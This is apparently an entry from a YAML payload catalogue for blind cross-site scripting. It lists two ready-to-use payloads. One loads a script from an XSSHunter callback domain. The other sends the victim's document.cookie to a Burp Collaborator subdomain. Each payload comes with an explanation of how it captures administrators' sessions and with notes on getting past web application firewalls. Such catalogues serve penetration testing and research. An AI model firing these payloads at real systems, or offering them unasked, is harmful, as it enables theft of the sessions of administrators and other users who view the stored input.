- slug: blind
  name: Blind XSS
  description: Payload fires in a different, unseen context (admin panel, backend tool) from where it was injected, requiring
    out-of-band callback infrastructure to detect execution.
  difficulty: high
  prerequisites:
  - Input stored and rendered in a different application context
  - Attacker has OOB callback infrastructure (XSSHunter, Burp Collaborator)
  payloads:
  - id: xss-blind-001
    title: XSSHunter callback payload
    payload_string: '"><script src=https://YOUR_ID.xss.ht></script>'
    how_it_works: 'XSSHunter is a service that hosts JavaScript payloads and captures execution context when they fire, including
      URL, cookies, DOM snapshot, and IP address. By injecting a script tag loading from XSSHunter into a field that may be
      viewed in a backend system, the attacker receives a notification with full context when any user (including administrators)
      views the stored payload. This is invaluable for identifying blind XSS in ticketing systems, logging platforms, and
      admin interfaces.

      '
    prerequisites:
    - XSSHunter account configured with callback domain
    - Target stores and renders input in another context
    waf_bypass_notes: Use HTTPs and obfuscate the src parameter if WAF inspects scripts
    severity_context: CVSS 8.8 – admin/backend context XSS with full session capture
    cve_refs: []
    tags:
    - blind
    - xsshunter
    - oob
    - admin-context
    - persistent
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: xss-blind-002
    title: Burp Collaborator blind XSS callback
    payload_string: <script>new Image().src='https://BURP_COLLAB.burpcollaborator.net?'+document.cookie</script>
    how_it_works: 'Burp Collaborator provides unique subdomains that log all incoming DNS lookups and HTTP requests. Injecting
      a payload that triggers an HTTP request to a Collaborator domain upon execution proves that XSS fired in an unseen context.
      Appending document.cookie captures the session context of whoever triggered it. The Collaborator panel shows the timestamp,
      origin IP, and any data sent in the request, confirming blind XSS execution even in admin panels the tester cannot directly
      access.

      '
    prerequisites:
    - Burp Suite Professional with Collaborator enabled
    - Target context makes external HTTP requests on script execution
    waf_bypass_notes: Use DNS-only callback if HTTP is blocked by backend firewall
    severity_context: CVSS 8.8 – session capture in blind context via OOB
